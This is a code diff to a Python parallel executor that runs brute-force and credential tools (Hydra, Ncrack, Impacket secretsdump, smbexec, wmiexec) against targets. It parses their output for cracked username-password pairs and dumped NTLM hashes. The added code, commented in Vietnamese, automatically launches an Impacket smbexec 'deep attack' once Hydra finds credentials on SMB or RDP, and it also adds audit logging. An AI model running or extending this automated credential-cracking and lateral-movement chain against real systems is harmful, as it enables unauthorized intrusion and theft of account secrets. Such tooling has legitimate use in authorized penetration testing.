@@ -4,6 +4,7 @@ import time
 from queue import Queue
 from utils import get_creation_flags
 import re
+from datetime import datetime
 
 class ParallelExecutor:
     def __init__(self, max_threads=5, log_function=None):
@@ -15,6 +16,8 @@ class ParallelExecutor:
         self.lock = threading.Lock()
         self.threads = []
         self._stop_flag = threading.Event()
+        self.audit_log = []
+        self.session_id = None
     
     def add_task(self, target_id, command, service):
         self.task_queue.put((target_id, command, service))
@@ -79,25 +82,25 @@ class ParallelExecutor:
                 # Log every attempt, parse success
                 if output:
                     for line in output.splitlines():
-                        l = line.strip()
+                        line = line.strip()
                         # Hydra/Ncrack attempt lines
-                        if "[ATTEMPT]" in l or "login:" in l:
+                        if "[ATTEMPT]" in line or "login:" in line:
                             # Try to extract attempted user/pass
-                            m = re.search(r'login:\s*"?(\S+)"?\s+password:\s*"?(\S+)"?', l)
+                            m = re.search(r'login:\s*"?(\S+)"?\s+password:\s*"?(\S+)"?', line)
                             if m:
                                 u, p = m.group(1), m.group(2)
                                 if self.log:
                                     self.log("Try", f"Tried {u}:{p} on {target} ({service})")
                         # Impacket/SMBexec may show attempted auth too
-                        if "Trying" in l and "@" in l:
+                        if "Trying" in line and "@" in line:
                             # Example: Trying user@target
                             if self.log:
-                                self.log("Try", l)
+                                self.log("Try", line)
                         # Success lines - Hydra/Ncrack
-                        if "login:" in l and "password:" in l and ("[SUCCESS]" in l or "success" in l.lower() or "valid" in l.lower()):
+                        if "login:" in line and "password:" in line and ("[SUCCESS]" in line or "success" in line.lower() or "valid" in line.lower()):
                             # Parse credentials
                             try:
-                                parts = l.split()
+                                parts = line.split()
                                 login_index = parts.index("login:")
                                 password_index = parts.index("password:")
                                 username = parts[login_index + 1]
@@ -107,7 +110,7 @@ class ParallelExecutor:
                                     found_credentials.append(cred)
                             except Exception:
                                 # fallback
-                                m = re.search(r'login:\s*"?(\S+)"?\s+password:\s*"?(\S+)"?', l)
+                                m = re.search(r'login:\s*"?(\S+)"?\s+password:\s*"?(\S+)"?', line)
                                 if m:
                                     cred = f"{m.group(1)}:{m.group(2)}"
                                     if cred not in found_credentials:
@@ -116,8 +119,8 @@ class ParallelExecutor:
                         if "impacket" in str(command).lower() or "python" in str(command).lower():
                             if "secretsdump" in str(command).lower():
                                 # Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-                                if ":::" in l and ":" in l:
-                                    parts = l.split(":")
+                                if ":::" in line and ":" in line:
+                                    parts = line.split(":")
                                     if len(parts) >= 5:
                                         username = parts[0]
                                         lm_hash = parts[3]
@@ -125,14 +128,14 @@ class ParallelExecutor:
                                         cred = f"{username}:{lm_hash}:{nt_hash}"
                                         found_credentials.append(cred)
                             elif any(x in str(command).lower() for x in ["smbexec", "wmiexec", "rdp_check"]):
-                                if "success" in l.lower() or "authentication successful" in l.lower():
+                                if "success" in line.lower() or "authentication successful" in line.lower():
                                     # Try to extract hash
-                                    m = re.search(r"with\s+hash\s+([a-f0-9]{32}:[a-f0-9]{32})", l, re.IGNORECASE)
+                                    m = re.search(r"with\s+hash\s+([a-f0-9]{32}:[a-f0-9]{32})", line, re.IGNORECASE)
                                     if m:
                                         found_credentials.append(m.group(1))
                                     # Or extract username
                                     else:
-                                        m = re.search(r"(\S+@\S+)", l)
+                                        m = re.search(r"(\S+@\S+)", line)
                                         if m:
                                             found_credentials.append(m.group(1))
                     
@@ -146,6 +149,14 @@ class ParallelExecutor:
                     "service": service
                 }
                 
+                # ✅ Kết hợp Hydra + Impacket
+                if "hydra" in str(command).lower() and found_credentials:
+                    if "smb" in service.lower() or "rdp" in service.lower():
+                        self.log("Info", f"Launching Impacket deep attack on {target}")
+                        # Tạo command Impacket (giả định)
+                        impacket_cmd = ["python", "-m", "impacket.examples.smbexec", target]
+                        self.add_task(f"{target_id}-impacket", impacket_cmd, service)
+                
             except Exception as e:
                 if self.log:
                     self.log("Error", f"Execution error: {str(e)}")
@@ -158,6 +169,15 @@ class ParallelExecutor:
                 with self.lock:
                     self.active_threads -= 1
                 self.task_queue.task_done()
+                
+                # Audit logging
+                self.audit_log.append({
+                    'timestamp': datetime.now().isoformat(),
+                    'target': target,
+                    'command': " ".join(command) if isinstance(command, list) else command,
+                    'output': output[:500] + ("..." if len(output) > 500 else ""),
+                    'success': bool(found_credentials)
+                })
     
     def start(self):
         self._stop_flag.clear()
